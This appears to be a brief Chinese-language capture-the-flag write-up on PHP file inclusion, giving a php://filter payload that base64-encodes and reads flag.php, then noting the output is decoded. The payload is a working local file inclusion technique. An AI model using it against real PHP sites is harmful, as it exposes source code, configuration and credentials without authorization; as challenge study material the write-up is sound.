# 知识点：

# 1.文件包含

# 2.php://filter协议读取文件内容



payload:

```javascript
?file=php://filter/read=convert.base64-encode/resource=flag.php
```



得到flag.php base64编码后的文件，解码即可